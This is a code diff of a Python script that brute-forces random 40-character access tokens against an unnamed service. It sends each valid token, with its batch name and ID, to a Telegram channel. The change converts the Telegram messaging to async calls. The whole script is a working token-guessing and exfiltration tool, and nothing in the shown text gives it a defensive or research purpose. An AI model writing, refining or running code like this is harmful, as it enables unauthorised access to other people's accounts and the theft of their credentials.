@@ -3,6 +3,8 @@ import random
 import string
 import requests
 from telegram import Bot
+from telegram.constants import ParseMode
+import asyncio
 import threading
 import time
 from concurrent.futures import ThreadPoolExecutor
@@ -18,6 +20,17 @@ bot = Bot(token=TELEGRAM_BOT_TOKEN)
 # Variables to track token checks
 tokens_checked = 0
 batches_found = 0
+
+# Async function to send a message to the Telegram channel
+async def send_to_telegram_async(message):
+    try:
+        await bot.send_message(chat_id=CHANNEL_CHAT_ID, text=message, parse_mode=ParseMode.HTML)
+    except Exception as e:
+        print(f"Error sending message to Telegram: {e}")
+
+# Wrapper to call async function in a sync context
+def send_to_telegram(message):
+    asyncio.run(send_to_telegram_async(message))
 
 # Function to generate a random 40-character token
 def generate_random_token():
@@ -46,24 +59,20 @@ def check_single_token(token):
                     batch_name = batch.get('batchName', 'N/A')
                     batch_id = batch.get('id', 'N/A')
                     # Send to Telegram
-                    send_to_telegram(token, batch_name, batch_id)
+                    message = f"Token: {token}\n{batch_name} - {batch_id}"
+                    send_to_telegram(message)
     except Exception as e:
         print(f"Error checking token: {e}")
 
 # Function to send progress updates to Telegram
 def send_progress_to_telegram(tokens_checked):
     message = f"Progress Update: {tokens_checked} tokens checked so far."
-    bot.send_message(chat_id=CHANNEL_CHAT_ID, text=message)
-
-# Function to send a message to the Telegram channel
-def send_to_telegram(token, batch_name, batch_id):
-    message = f"Token: {token}\n{batch_name} - {batch_id}"
-    bot.send_message(chat_id=CHANNEL_CHAT_ID, text=message)
+    send_to_telegram(message)
 
 # Function to send a startup message to the Telegram channel
 def send_startup_message():
     message = "The bot has started successfully and is now monitoring tokens."
-    bot.send_message(chat_id=CHANNEL_CHAT_ID, text=message)
+    send_to_telegram(message)
 
 # Function to check tokens in batches of 50 per second
 def check_tokens():
